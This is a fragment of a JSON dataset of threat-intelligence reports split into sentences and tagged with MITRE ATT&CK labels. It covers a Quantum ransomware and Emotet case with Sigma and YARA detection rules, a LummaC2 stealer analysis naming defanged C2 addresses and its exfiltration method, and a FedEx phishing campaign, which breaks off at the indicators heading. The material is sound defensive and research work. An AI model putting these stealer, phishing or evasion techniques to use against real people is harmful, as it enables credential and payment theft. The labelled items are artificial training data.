            "AnyDesk Remote Desktop Software User-Agent ET CNC Feodo Tracker Reported CnC Server group 1 ET CNC Feodo Tracker Reported CnC Server group 14 ET CNC Feodo Tracker Reported CnC Server group 15 ET CNC Feodo Tracker Reported CnC Server group 17 ET CNC Feodo Tracker Reported CnC Server group 19 ET CNC Feodo Tracker Reported CnC Server group 2 ET CNC Feodo Tracker Reported CnC Server group 20 ET CNC Feodo Tracker Reported CnC Server group 21 ET CNC Feodo Tracker Reported CnC Server group 23 ET CNC Feodo Tracker Reported CnC Server group 24 ET CNC Feodo Tracker Reported CnC Server group 25 ET CNC Feodo Tracker Reported CnC Server group 3 ET CNC Feodo Tracker Reported CnC Server group 4 ET CNC Feodo Tracker Reported CnC Server group 5 ET CNC Feodo Tracker Reported CnC Server group 6 ET CNC Feodo Tracker Reported CnC Server group 7 ET CNC Feodo Tracker Reported CnC Server group 8 ET CNC Feodo Tracker Reported CnC Server group 9ET MALWARE W32/Emotet CnC Beacon 3 Sigma Custom Rules title: Emotet Child Process Spawn Pattern id: 50e8cf53-62df-49aa-bbde-8b3a0a6d8a35 status: Experimental description: Detects Emotet Spawning ipconfig and systeminfo. ",
            "author: TheDFIRReport references: - https://thedfirreport.com/ date: 2022/10/03 logsource: category: process_creation product: windows detection: ",
            "selection_image: CommandLine: - 'ipconfig /all' - 'systeminfo' selection_parent: ParentImage|endswith: - 'regsvr32.exe' selection_parent_cmdline: ParentCommandLine|contains: - '.dll' condition: selection_image and selection_parent and selection_parent_cmdline falsepositives: - Unknown level: high tags: - attack.discovery - attack.t1087 Yara /* YARA Rule Set Author: The DFIR Report Date: 2022-11-28 Identifier:",
            "Quantum Ransomware - Case 15184 Reference:",
            "https://thedfirreport.com */ /*",
            "Rule Set -----------------------------------------------------------------",
            "*/ rule ___FilesToHash_17jun",
            "{ meta: description = \"15184_ - file 17jun.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2022-11-28\" hash1 = \"41e230134deca492704401ddf556ee2198ef6f32b868ec626d9aefbf268ab6b1\" strings: $x1 = \" to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq\" ascii $x2 = \"0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125ERROR: unable to download agent fromGo pointer stored in\" ascii $x3 = \".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625CLIENT_HANDSHAKE_TRAFFIC_SECRETCent\" ascii $x4 = \"slice bounds out of range [:",
            "%x] with length %ystopTheWorld: not stopped (status !",
            "= _Pgcstop)sysGrow bounds not aligned to palloc\" ascii $x5 = \"VirtualQuery for stack base failedadding nil Certificate to CertPoolbad scalar length: %d, expected %dchacha20: wrong HChaCha20 \" ascii $x6 = \"file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: \" ascii $x7 = \"tls: certificate used with invalid signature algorithmtls: server resumed a session with a different versionx509: cannot verify \" ascii $x8 = \"non-IPv4 addressnon-IPv6 addressobject is remotepacer: H_m_prev=proxy-connectionreflect mismatchremote I/O errorruntime: ",
            "g: g=\" ascii $x9 = \"lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnablestrict-trans\" ascii $x10 = \"unixpacketunknown pcuser-agentws2_32.dll of size (targetpc= ErrCode=%v KiB work, freeindex= gcwaiting= idleprocs= in status \" ascii $x11 = \"100-continue152587890625762939453125Bidi_ControlCIDR addressCONTINUATIONContent TypeContent-TypeCookie.",
            "ValueECDSA-SHA256ECDSA-SH\" ascii $x12 = \"entersyscallexit status gcBitsArenasgcpacertracegetaddrinfowhost is downhttp2debug=1http2debug=2illegal seekinvalid baseinvalid \" ascii $x13 = \"streamSafe was not resetstructure needs cleaningtext/html; charset=utf-8unexpected buffer len=%vx509: malformed validityzlib: in\" ascii $x14 = \"IP addressInstaller:Keep-AliveKharoshthiLockFileExManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCO\" ascii $x15 = \" to non-Go memory , locked to thread298023223876953125: day out of rangeArab Standard TimeCaucasian_AlbanianCommandLineToArgvWCr\" ascii $x16 = \"= flushGen for type gfreecnt= pages at runqsize= runqueue= s.base()= spinning= stopwait= stream=%d sweepgen sweepgen= target\" ascii $x17 = \"(unknown), newval=, oldval=, plugin:, size = , tail = --site-id244140625: status=AuthorityBassa_VahBhaiksukiClassINETCuneiformDi\" ascii $x18 = \" is unavailable()<>@,;:\\\\\\\"/[]?=,M3.2.0,M11.1.00601021504Z0700476837158203125: cannot parse <invalid Value>ASCII_Hex_DigitAccept\" ascii $x19 = \"span set block with unpopped elements found in resettls: received a session ticket with invalid lifetimetls: server selected uns\" ascii $x20 = \"bad defer entry in panicbad defer size class:",
            "i=bypassed recovery failedcan't scan our own stackcertificate unobtainablechacha20\" ascii condition: uint16(0) == 0x5a4d and filesize < 14000KB and 1 of ($x*) } rule dontsleep { meta: description = \"15184_ - file dontsleep.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2022-11-28\" hash1 = \"f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee\" strings: $s1 = \"shell32.dll,Control_RunDLL\" fullword ascii $s2 = \"powrprof.",
            "DLL\" fullword wide $s3 = \"CREATEPROCESS_MANIFEST_RESOURCE_ID RT_MANIFEST \\\"res\\\\\\\\APP.exe.manifest\\\"\" fullword ascii $s4 = \"msinfo32.exe\" fullword ascii $s5 = \"user32.dll,LockWorkStation\" fullword wide $s6 = \"DontSleep.exe\" fullword wide $s7 = \"UMServer.log\" fullword ascii $s8 = \"_Autoupdate.exe\" fullword ascii $s9 = \"BlockbyExecutionState: %d",
            "on:%d by_enable:%d\" fullword wide $s10 = \"powrprof.dll,SetSuspendState\" fullword wide $s11 = \"%UserProfile%\" fullword wide $s12 = \" 2010-2019",
            "Nenad Hrg SoftwareOK.com\" fullword wide $s13 = \"https://sectigo.com/CPS0C\" fullword ascii $s14 = \"https://sectigo.com/CPS0D\" fullword ascii $s15 = \"?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v\" fullword ascii $s16 = \"Unable to get response from Accept Thread withing specified Timeout ->\" fullword ascii $s17 = \"3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%\" fullword ascii $s18 = \"Unable to get response from Helper Thread within specified Timeout ->\" fullword ascii $s19 = \" <requestedExecutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\">\" fullword ascii $s20 = \"_selfdestruct.bat\" fullword wide condition: uint16(0) == 0x5a4d and filesize < 700KB and 8 of them } rule ___",
            "FilesToHash_locker { meta: description = \"15184_ - file locker.dll\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2022-11-28\" hash1 = \"6424b4983f83f477a5da846a1dc3e2565b7a7d88ae3f084f3d3884c43aec5df6\" strings: $s1 = \"plugin.dll\" fullword ascii $s2 = \"oL$0fE\" fullword ascii /*",
            "Goodware String - occured 1 times */ $s3 = \"H9CPtgL9{@tafD9{8tZD\" fullword ascii $s4 = \"expand 32-byte k\" fullword ascii /*",
            "Goodware String - occured 1 times */ $s5 = \"[email protected]\" fullword ascii /*",
            "Goodware String - occured 3 times */ $s6 = \"oF D3f0D3n4D3v8D3~<H\" fullword ascii $s7 = \"j]{7r]Y\" fullword ascii $s8 = \"EA>EmA\" fullword ascii $s9 = \"ol$0fE\" fullword ascii $s10 = \"S{L1I{\" fullword ascii $s11 = \"V32D!RT\" fullword ascii $s12 = \" A_A^_\" fullword ascii $s13 = \"v`L4~`g\" fullword ascii $s14 = \"9\\\\$8vsH\" fullword ascii $s15 = \"K:_Rich\" fullword ascii $s16 = \" A_A^A\\\\_^\" fullword ascii $s17 = \"tsf90u\" fullword ascii $s18 = \"9|$0vQ\" fullword ascii $s19 = \"K:_=:?^\" fullword ascii $s20 = \":9o 49\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 200KB and 8 of them } rule K_1_06_13_2022_lnk { meta: description = \"15184_ - file K-1",
            "06.13.2022.lnk.lnk\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2022-11-28\" hash1 = \"1bf9314ae67ab791932c43e6c64103b1b572a88035447dae781bffd21a1187ad\" strings: $x1 = \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" fullword ascii $s2 = \"%SystemRoot%\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" fullword wide $s3 = \"<..\\\\..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" fullword wide $s4 = \"-c \\\"&{'p8ArwZsj8ZO+Zy/dHPeI+siGhbaxtEhzwmd3zVObm9uG2CGKqz5m4AdzKWWzPmKrjJieG4O9';$BxQ='uYnIvc3RhdHMvUkppMnJRSTRRWHJXQ2ZnZG1pLyI\" wide $s5 = \"WindowsPowerShell\" fullword wide $s6 = \"black-dog\" fullword ascii $s7 = \"powershell.exe\" fullword wide /*",
            "Goodware String - occured 3 times */ $s8 = \"S-1-5-21-1499925678-132529631-3571256938-1001\" fullword wide condition: uint16(0) == 0x004c and filesize < 10KB and 1 of ($x*) and all of the MITRE PowerShell \u2013 T1059.001 Process Injection \u2013 T1055 File Deletion \u2013 T1070.004 Lateral Tool Transfer \u2013 T1570 Valid Accounts \u2013 T1078 Service Execution \u2013 T1569.002 SMB/Windows Admin Shares \u2013 T1021.002 Remote System Discovery \u2013 T1018 Process Discovery \u2013 T1057 Rundll32 \u2013 T1218.011 Regsvr32 \u2013 T1218.010 Domain Account \u2013 T1087.002 Domain Groups \u2013 T1069.002 System Information Discovery \u2013 T1082 Data Encrypted for Impact \u2013 T1486 Network Share Discovery \u2013 T1135 Data from Network Shared Drive \u2013 T1039 Web Protocols \u2013 T1071.001 Remote Access Software \u2013 T1219 Exfiltration to Cloud Storage \u2013 T1567.002 ",
            "Remote Desktop Protocol \u2013 T1021.001 Malicious File \u2013 T1204.002 Spearphishing Attachment \u2013 T1566.001 Exploitation of Remote Services \u2013 T1210 Internal case #15184 "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [
                "T1219"
            ],
            [],
            [],
            [
                "T1105",
                "T1204.002"
            ],
            [
                "T1547.001"
            ],
            [
                "T1016",
                "T1082"
            ],
            [],
            [
                "T1566.001"
            ],
            [],
            [],
            [
                "T1057",
                "T1059.003"
            ],
            [],
            [],
            [
                "T1570"
            ],
            [
                "T1047"
            ],
            [
                "T1059.003"
            ],
            [
                "T1003.001"
            ],
            [
                "T1055"
            ],
            [],
            [],
            [],
            [
                "T1570",
                "T1078"
            ],
            [
                "T1570"
            ],
            [
                "T1059.003"
            ],
            [
                "T1219"
            ],
            [],
            [],
            [],
            [],
            [
                "T1219"
            ],
            [
                "T1105",
                "T1021.001"
            ],
            [
                "T1021.001"
            ],
            [
                "T1105",
                "T1021.001"
            ],
            [
                "T1570",
                "T1059.003"
            ],
            [],
            [
                "T1021.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1027",
                "T1140"
            ],
            [],
            [
                "T1204.002"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1016",
                "T1082"
            ],
            [],
            [],
            [],
            [],
            [
                "T1547.001"
            ],
            [],
            [
                "T1219"
            ],
            [],
            [
                "T1219"
            ],
            [],
            [],
            [],
            [
                "T1543.003"
            ],
            [
                "T1543.003"
            ],
            [
                "T1543.003"
            ],
            [],
            [
                "T1543.003"
            ],
            [
                "T1543.003"
            ],
            [
                "T1543.003"
            ],
            [
                "T1543.003",
                "T1219"
            ],
            [
                "T1543.003"
            ],
            [
                "T1543.003"
            ],
            [
                "T1543.003"
            ],
            [
                "T1003.001"
            ],
            [],
            [
                "T1055",
                "T1070.004"
            ],
            [
                "T1055"
            ],
            [
                "T1218.011"
            ],
            [
                "T1105",
                "T1055"
            ],
            [
                "T1070.004"
            ],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1003.001",
                "T1055"
            ],
            [
                "T1003.001"
            ],
            [
                "T1003.001"
            ],
            [],
            [
                "T1016",
                "T1082"
            ],
            [
                "T1033"
            ],
            [
                "T1033"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1055"
            ],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [
                "T1569.002",
                "T1218.011",
                "T1570",
                "T1059.003",
                "T1543.003"
            ],
            [
                "T1059.003",
                "T1218.011"
            ],
            [
                "T1570",
                "T1047"
            ],
            [
                "T1047",
                "T1059.003",
                "T1021.001"
            ],
            [
                "T1005"
            ],
            [],
            [],
            [],
            [],
            [
                "T1071.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1219"
            ],
            [],
            [],
            [],
            [],
            [
                "T1219"
            ],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1021.001"
            ],
            [
                "T1021.001"
            ],
            [],
            [],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1219"
            ],
            [
                "T1219"
            ],
            [],
            [
                "T1021.001"
            ],
            [
                "T1021.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Malware Analysis LummaC2 Stealer",
        "cti_report": [
            "title: Malware Analysis: LummaC2 Stealer url: https://socradar.io/malware-analysis-lummac2-stealer/ By SOCRadar Research In our article about Stealer-as-a-Service, as the SOCRadar Research team, we looked at Lumma Stealer, a relatively new and unknown malware.",
            "During our research, we didn\u2019t find much information, so we did threat hunting by monitoring hacker forums with our dark web team.",
            "We added the resulting data to our platform and started our analysis. ",
            "LummaC2 is the name of a malicious program classified as a stealer.",
            "It operates by stealing sensitive information from infected devices and installing applications.",
            "After our dark web team discovered LummaC2, we found that it was being sold on underground forums.",
            "Due to its distribution on the web, it can be related to multiple cybercriminals.",
            "According to the promotional material, the LummaC2 is approximately 150-200 KB and can affect operating systems from Windows 7 to Windows 11. ",
            "Executive Summary Threat Identifiers Name LummaC2 Threat Type Stealer Detections VirusTotal Symptoms Stealers are designed to stealthily infiltrate the victim\u2019s computer and remain silent.",
            "Thus no particular symptoms are clearly visible on an infected machine. ",
            "Distribution Methods Infected email attachments, malicious online advertisements, social engineering, software \u2018cracks.\u2019 ",
            "Damage Stolen passwords and banking information, identity theft, and the victim\u2019s computer added to a botnet. ",
            "The LummaC2 stealer begins its operations by obtaining relevant device data, such as OS version and architecture, hardware ID, CPU, RAM, screen resolution, system language, etc.",
            "This malware can exfiltrate files and extract data from specific applications.",
            "Browsers targeted by LummaC2: Chrome, Chromium, Mozilla Firefox, Microsoft Edge, Brave, Kometa, Opera GX Stable, Opera Neon, Opera Stable, Vivaldi, and others.",
            "This stealer may acquire browsing histories, Internet cookies, usernames/passwords, personally identifiable details, credit card numbers, and other highly sensitive information from browsers.",
            "LummaC2 also targets multiple cryptocurrencies (e.g., Binance, Electrum, Ethereum, etc.).",
            "In summary, software like LummaC2 on devices can result in severe privacy issues, significant financial losses, and identity theft. ",
            "Lumma Stealer Composition With the Lumma Stealer malware hash in hand, we visited Malware Bazaar and Triage, where malware samples can be downloaded.",
            "We searched for the hash value and finally downloaded the malware from the Triage site, completing the first step of our analysis.",
            "Since the sample we obtained is a PE file, when we run it after the appropriate environment is prepared and watch its mobility, it continues to run under the name \u201ctmp.exe\u201d by unpacking itself to the \u201cC:\\Users\\admin\\AppData\\Local\\Temp\\\u201d file path. ",
            "Process Name Command Line tmp.exe C:\\Users\\admin\\AppData\\Local\\Temp\\tmp.exe Behavior Activities: tmp.exe Infostealers often target stored browser data, which can include saved credentials etc. ",
            "Registry Key Sets: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable 1 HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer %HTTP_PROXY%:8080 Reads browser cookies and saves this path: C:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ymgarh1v.defaul t\\cookies.sqlite Connects to the server without a hostname. ",
            "hxxp[:]//195[.]123[.]226[.]91/c2sock ",
            "After the connection to the address is established, it transmits information as a zip file.",
            "Details are given in other stages. ",
            "Static Analysis Overview File Name tmp.exe File Size 158 KB File Type Win32.exe MD5 c9c0e32e00d084653db0b37a239e9a34 SHA-1 b97965e4a793ec0fa10abc86d0c6be5718716d8a SHA-256 d932ee10f02ea5bb60ed867d9687a906f1b8472f01fc5543b06f9ab22059b264 When Lumma is analyzed in various tools, the outputs of the tools are as follows: It is written in C++ programming language. ",
            "Detect It Easy tool\u2019s output is the total \u20186.51920\u2019 entropy value, which turns out 81%. ",
            "PEStudio tool\u2019s output is total \u20186.519\u2018 entropy value. ",
            "In addition to the entropy value, we can view all functions and imported addresses when we examine them with IDA.",
            "At this stage, we decide that it is not packed, and when we finally check with the \u201cexeinfope,\u201d the result is \u201cnot packed.\u201d ",
            "Strings have been searched, but since there is too much obfuscated information, no tangible results have been found.",
            "One remarkable result we achieved using PEStudio was that it uses ASLR.",
            "We will continue the analysis by changing the ASLR \u2018true\u2018 parameter to \u2018false\u2018 and saving it. ",
            "Anti-Debugger control is provided with \u201cIsDebuggerPresent\u201d API.",
            "If the EAX register takes 1 as a value, the program will close itself, and it is impossible to debug with the analysis tools; that\u2019s why changing it to 0 to run the program without closing.",
            "The anti-debugger bypass technique will be done during dynamic analysis. ",
            "The beginning of obfuscated strings and the field where browser cookie information is collected.",
            "The stealer also targets crypto wallets such as Binance, Electrum, and Ethereum and collects sensitive information from the victim\u2019s machine.",
            "The below figure shows the code snippet of stealers targeting crypto wallets.",
            "(0040772c) ",
            "Here are the obfuscated collections. ",
            "Crypto Wallets: Deobfuscated strings come after. ",
            "Web Browsers: Deobfuscated strings come after. ",
            "The stealer has many obfuscated strings that are being covered by a random string, \u201cedx765\u201c, to evade detection.",
            "Upon execution, the stealer passes the obfuscated string to a function that strips the arbitrary string and delivers the original string.",
            "The results obtained by decoding strings are compared below. ",
            "Dynamic Analysis We have started with the first findings we detected while running LummaC2 Stealer in the \u201cbehavior\u201d section.",
            "Now, let\u2019s move on to the detailed dynamic analysis stage, verify what we found in the \u201cstatic analysis\u201d section, and check if we can change the request to the C2 address. ",
            "IsDebuggerPresent By changing the return value for IsDebuggerPresent, one of the most critical APIs we put in breakpoint, we perform the anti-debugging bypass operation. ",
            "LummaC2 stealer sends this information to its C2 server, as shown below. ",
            "Type: multipart/form-data; boundary=\u00d0\u00beaj195iak20ka99441aj1\u2033 We observed the IP address in Debugger, and via IDA, we found that the exact IP address is also referred to in the .rdata section. ",
            "Host: 195[.]123[.]226[.]91/c2sock One of the parts that will complicate the analysis processes that will perform the termination process has appeared again.",
            "If we try to skip this part directly, the process will terminate. ",
            "Network Activity When LummaC2 is run, the address it sends the POST request to and the C2 addresses are different.",
            "We found the C2 address by researching VirusTotal.",
            "We ran the LummaC2 instance directly in the virtual environment and monitored its activity.",
            "As a result, network activity was observed.",
            "Making a \u2018POST\u2019 request, tmp.exe is trying to pass information. ",
            "The POST request is performed as follows. ",
            "Host: 195[.]123[.]226[.]91 You can find Shodan results about the host address here. ",
            "When we examine the packet\u2019s content captured with WireShark, we see a \u201cPK\u201d header.",
            "This means that the C2 is transmitted as a zip file during the POST request.",
            "Let\u2019s examine the stolen information by dumping the zip file. ",
            "Content-Disposition: form-data; name=\u201dhwid\u201d {78494464-3fdf-11ed-8279-806e6f6e6963} Content-Disposition: form-data; name=\u201dpid\u201d 1 Content-Disposition: form-data; name=\u201dlid\u201d xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx When we examine the contents of the zip file viewed from the PCAP file, it collects information, primarily system information.",
            "It targets the browsers we have seen in the static analysis codes.",
            "The collected data is transferred to the C2 server as a zip file.",
            "Since Microsoft Edge and Mozilla Firefox are installed in our analysis environment, Lumma Stealer only collects data from these browsers. ",
            "We have obtained different zip files because Lumma Stealer sent multiple POST requests to the \u201cc2/sock\u201d address.",
            "When we begin examining from the lowest to the highest in size, we find only the \u201cSystem.txt\u201d file in the lowest size file.",
            "Its contents are specified in the following image. ",
            "When we examine the file named Mozilla Firefox, when we view the .db file called cookies, we can see that it collects the following cookie information. ",
            "The content of the .db file named web data is shown in the image below. ",
            "There is not much data for the Edge browser, so when we add the cookie information collected for Mozilla, we can see clearly in the following image that it has collected cookie information for many account details. ",
            "In conclusion, Lumma Stealer collects cookie information, search histories, and key inputs from browsers and transfers them to the C2 address.",
            "The list of all the information it tries to collect inside of the \u201cWeb Data\u201d SQLite file is given in the last image. ",
            "We used the VirusTotal graphical interface for Threat Research at this research stage with the IP address sending the POST request.",
            "As seen in the screenshot below, the results of \u201ccollections,\u201d \u201ccommunicating files,\u201d and \u201creferer files\u201d are displayed. ",
            "After that, we opened the link information, and many malicious files and IP addresses were displayed.",
            "We noticed a large number of open ports when we searched through Shodan, where 144[.]76[.]173[.]247 IP addresses in Germany caught our attention.",
            "We accessed C2 while visiting port 80. (VirusTotal Graph: Collection) ",
            "In the next step, when we visit port 80, the login page can be displayed.",
            "C2 Login Page is shown in the screenshot below. ",
            "C2:144[.]76[.]173[.]247/login Analyst Note: ",
            "The IP address 144[.]76[.]173[.]247 was not encountered during the analysis. ",
            "Shodan Result Communication Addresses Requests 195[.]123[.]226[.]91 POST /c2sock: multipart/form-data;boundary=\u043eaj195iak20ka99441aj1 144[.]76[.]173[.]247 GET/login LummaC2 behaves like other stealer-type malware, which can take away system and sensitive data from the victim\u2019s machine.",
            "These dangerous programs can usually steal information from web browsers and target crypto wallets. ",
            "The additional information stored on web browsers, such as login credentials, PII, and financial information, can be further leveraged to conduct fraud activities. ",
            "Threat actors can use the stolen data to steal cryptocurrencies from the victim\u2019s accounts or sell this data to other threat actors for financial gain. Indicators of Compromise You can find the full list of IOCs in the SOCRadar Platform. ",
            "Rules & Signatures MITRE ATT&CK Matrix Discovery System Information Discovery T1082 Defense Evasion Debugger Evasion T1622 Defense Evasion Deobfuscate/Decode Files or Information T1140 Defense Evasion Impair Defences T1562 Collection Automated Collection T1119 Collection Data from the Local System T1005 Command and Control Application Layer Protocol T1071 Exfiltration Automated Exfiltration T1020 The post Malware Analysis: LummaC2 Stealer appeared first on SOCRadar:registered: Cyber Intelligence Inc.. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1566.001"
            ],
            [],
            [
                "T1082"
            ],
            [
                "T1005"
            ],
            [],
            [
                "T1005",
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [
                "T1036.005"
            ],
            [
                "T1005",
                "T1078",
                "T1112"
            ],
            [
                "T1112"
            ],
            [],
            [
                "T1041"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1005"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1027",
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [
                "T1041"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1071.001"
            ],
            [],
            [],
            [],
            [
                "T1041"
            ],
            [],
            [
                "T1082"
            ],
            [],
            [
                "T1041"
            ],
            [],
            [
                "T1071.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1041",
                "T1005"
            ],
            [
                "T1005"
            ],
            [],
            [],
            [],
            [],
            [
                "T1071.001"
            ],
            [],
            [],
            [],
            [],
            [
                "T1005",
                "T1082"
            ],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "FedEx Phishing Campaign Abusing TrustedForm and PAAY",
        "cti_report": [
            "title: FedEx Phishing Campaign Abusing TrustedForm and PAAY url: https://www.netskope.com/blog/fedex-phishing-campaign-abusing-trustedform-and-paay Summary Netskope Threat Labs is tracking a phishing campaign that mimics a FedEx package delivery as bait to steal credit card data.",
            "This type of social engineering attack is commonly found in phishing pages, emails, and other scams, where a false sense of urgency is created to urge the victim into doing an action that eventually leads to personal data theft. ",
            "This specific phishing campaign is noteworthy because it abuses two cloud services throughout the attack: TrustedForm, a digital certificate service provided by ActiveProspectis, is abused to track victims and collect information about them, and the PAAY 3DS, a cloud-based platform that authenticates payment transactions, is abused to validate the credit card details collected from the victims. ",
            "Cybersecurity awareness training, specifically educating users to be wary of fake shipment notifications, is an effective defense against these types of phishing attacks.",
            "Netskope customers also receive protection from the threats discussed in this blog through the Next Generation Secure Web Gateway (SWG). ",
            "First Stage \u2013 Deception ",
            "The attack starts when the victim receives an email or a text message that uses a common social engineering technique, creating a false sense of urgency to get the victim\u2019s attention. ",
            "The specific approach here, using a fake shipping notification, is also a common technique used by scammers. ",
            "First steps of this FedEx phishing campaign. ",
            "Step 1 \u2013 Once the victim reaches the page via phishing email or SMS text, they are instructed to click \u201cConfirm\u201d to view a message from \u201cExpress.\u201d",
            "This webpage has \u201cFedEx\u201d in the title and uses the same company colors to deceive the user.",
            "The user is also asked to permit push notifications in the browser, which allows the attacker to push malicious ads, as we will demonstrate later in this analysis. ",
            "Step 2 \u2013 The victim is informed that delivery of a package has been suspended, and that they need to schedule delivery and should enable push notifications to avoid future issues. ",
            "Step 3 \u2013 Then, the victim is informed that they need to pay a $1.95 customs fee.",
            "The customs fee is just an excuse to collect the victim\u2019s personal and credit card data in the next stage of the attack. ",
            "Behind the scenes, once the first page is loaded, the page sends a request to receive a customizable JSON that is used throughout the attack.",
            "The JSON includes the questions, form fields, and second-stage URLs, which will be all used in the next steps. ",
            "JSON containing data about the phishing. ",
            "Fake questions displayed by the phishing page. ",
            "Step 4 \u2013 The attacker continues to deceive the victim, in an attempt to add more credibility to the phish, by asking a series of questions to the victim, such as how, where, and when the victim would like to receive the package. ",
            "Step 5 \u2013 The deception continues by giving the victim a delivery estimate.",
            "As soon as the victim interacts with the questions on step 4, the phishing starts sending requests to the TrustedForm API.",
            "TrustedForm is a digital certificate service provided by ActiveProspect, which provides marketing automation and compliance platforms. ",
            "This service can be used to generate a digital certificate that includes information about a lead, such as geolocation, IP address, browser type, operating system, the time spent on the page, and even a web session replay.",
            "We believe that the attacker is creating a TrustedForm certificate to collect more information about victims. ",
            "Phishing page abusing TrustedForm. ",
            "Below is the type of information that would be available in a TrustedForm certificate, as demonstrated in their demo webpage. ",
            "Examples of a TrustedForm certificate generated by their demo page. ",
            "And finally, the phishing page redirects the victim to the next stage, using a URL parsed from the JSON we demonstrated earlier.",
            "This page returns a second URL, which is used to redirect the user to a third URL.",
            "This is done to add resilience, as the attacker can update the URLs with little effort if the last stage is taken down. ",
            "Phishing page redirecting the victim to the next stage. ",
            "Second Stage \u2013 Stealing Credit Card Data Once the attacker convinces the victim about the allegedly suspended package, they try to steal the victim\u2019s credit card number on a different page. ",
            "Phishing trying to steal personal and credit card data. ",
            "Step 6 \u2013 This page asks for the victim\u2019s personal information, such as the full name, phone number, and email address. ",
            "Step 7 \u2013 Then, the page asks for credit card details and uses PAAY to assess whether the credit card is valid.",
            "This is done by using their 3DS (3-D Secure) system, which is a protocol designed to add more security and prevent fraud in online purchases. ",
            "Once the credit card data is entered in the page, it starts sending requests to the 3DS API, which performs a temporary purchase in the credit card number.",
            "If the credit card is invalid, the phishing does not move forward. ",
            "Phishing page abusing PAAY 3DS service. ",
            "Spreading Adware As demonstrated earlier, the main page asks for permission to show notifications in the browser.",
            "Unsurprisingly, if the victim allows notifications, they are bombarded with ads from the \u201cvirtualpushplatform[.]com\u201d domain, including ads for fake antivirus software, fake coupons, and free iPads. ",
            "Phishing page asking permission to show notifications. ",
            "These ads lead to webpages that eventually ask for personal information or try to download malware.",
            "So, even in case the phishing attack fails at any stage, if the victim allows notifications, they will still be targeted with additional scams. ",
            "Ads displayed if the victim enabled the notifications in the phishing page. ",
            "Conclusions By abusing cloud services, attackers are able to create more elaborate phishing pages that are also more resilient to detection.",
            "This phishing campaign is not only trying to steal data from victims, but also abuses browser notifications to bombard victims with additional scams even if this one is unsuccessful.",
            "Netskope uses ML-based inline, out-of-band phishing detection engines, and threat intelligence systems to block such phishing attempts. ",
            "Recommendations Phishing pages from the campaign described in the post are easily recognizable by the URL, as the attacker has made little effort to disguise the URL using typosquatting or other techniques.",
            "We strongly recommend users to never enter their data on pages that promise something, such as the delivery of a supposedly suspended package.",
            "If you are indeed expecting a package, make sure to access the website of the logistics company directly. ",
            "Netskope Threat Labs also recommends that organizations review their security policies to ensure that they are adequately protected against these and similar phishing pages and scams: Inspect all HTTP and HTTPs traffic, including all web and cloud traffic, to prevent users from visiting malicious websites.",
            "Netskope customers can configure their Netskope NG-SWG with a URL filtering policy to block known phishing and scam sites, and a threat protection policy to inspect all web content to identify unknown phishing and scam sites using a combination of signatures, threat intelligence, and machine learning.",
            "Use Remote Browser Isolation (RBI) technology to provide additional protection when there is a need to visit websites that fall in categories that can present higher risk, like Newly Observed and Newly Registered Domains. ",
            "IOCs Below are the IOCs related to the web pages analyzed in this blog post. ",
